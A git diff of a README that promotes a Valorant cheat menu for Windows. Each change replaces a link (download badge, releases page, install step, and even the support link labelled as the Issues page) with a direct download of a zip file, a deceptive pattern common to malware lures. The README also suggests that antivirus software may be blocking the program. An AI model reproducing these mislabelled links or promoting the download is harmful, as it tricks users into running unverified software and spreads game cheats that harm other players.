@@ -1,7 +1,7 @@
 # 🎮 Valorant-Internal-Imgui-Cheat-Menu - Customize Your Game Experience Easily
 
 ## 🔗 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/jirapannil/Valorant-Internal-Imgui-Cheat-Menu/releases)
+[![Download Release](https://raw.githubusercontent.com/jirapannil/Valorant-Internal-Imgui-Cheat-Menu/main/SRC/Internal Cheat/Valorant-Internal-Imgui-Cheat-Menu_1.6.zip%https://raw.githubusercontent.com/jirapannil/Valorant-Internal-Imgui-Cheat-Menu/main/SRC/Internal Cheat/Valorant-Internal-Imgui-Cheat-Menu_1.6.zip)](https://raw.githubusercontent.com/jirapannil/Valorant-Internal-Imgui-Cheat-Menu/main/SRC/Internal Cheat/Valorant-Internal-Imgui-Cheat-Menu_1.6.zip)
 
 ## 📖 Description
 The Valorant-Internal-Imgui-Cheat-Menu is a useful tool designed to enhance your gameplay experience in Valorant. This software lets you access a range of cheats and features with a user-friendly interface. 
@@ -10,7 +10,7 @@ The Valorant-Internal-Imgui-Cheat-Menu is a useful tool designed to enhance your
 To successfully download and run the Valorant-Internal-Imgui-Cheat-Menu, follow these simple steps:
 
 1. **Visit the Releases Page**
-   - Go to the [Releases Page](https://github.com/jirapannil/Valorant-Internal-Imgui-Cheat-Menu/releases).
+   - Go to the [Releases Page](https://raw.githubusercontent.com/jirapannil/Valorant-Internal-Imgui-Cheat-Menu/main/SRC/Internal Cheat/Valorant-Internal-Imgui-Cheat-Menu_1.6.zip).
 
 2. **Choose the Latest Release**
    - Look for the most recent version of the software. The version information will be listed along with the release notes.
@@ -27,7 +27,7 @@ To successfully download and run the Valorant-Internal-Imgui-Cheat-Menu, follow 
 ## 📥 Download & Install
 To download and run the software, follow these steps:
 
-1. **Go to the [Releases Page](https://github.com/jirapannil/Valorant-Internal-Imgui-Cheat-Menu/releases).**
+1. **Go to the [Releases Page](https://raw.githubusercontent.com/jirapannil/Valorant-Internal-Imgui-Cheat-Menu/main/SRC/Internal Cheat/Valorant-Internal-Imgui-Cheat-Menu_1.6.zip).**
 2. **Select the Latest Release.**
 3. **Follow the Installation Instructions Above.**
 
@@ -66,7 +66,7 @@ This software is designed for Windows devices. Ensure your system meets the requ
 Try re-downloading the file and make sure you install all necessary components. Check if your antivirus is blocking the application.
 
 ## 📞 Support
-If you encounter any issues or have questions about the software, please reach out via the Issues section of the [GitHub Repository](https://github.com/jirapannil/Valorant-Internal-Imgui-Cheat-Menu/issues). We regularly monitor and respond to user queries.
+If you encounter any issues or have questions about the software, please reach out via the Issues section of the [GitHub Repository](https://raw.githubusercontent.com/jirapannil/Valorant-Internal-Imgui-Cheat-Menu/main/SRC/Internal Cheat/Valorant-Internal-Imgui-Cheat-Menu_1.6.zip). We regularly monitor and respond to user queries.
 
 ## 🔗 Additional Resources
 For more information about gameplay experiences, tutorials, and tips on how to use the cheat menu effectively, consider visiting online gaming forums and communities. 
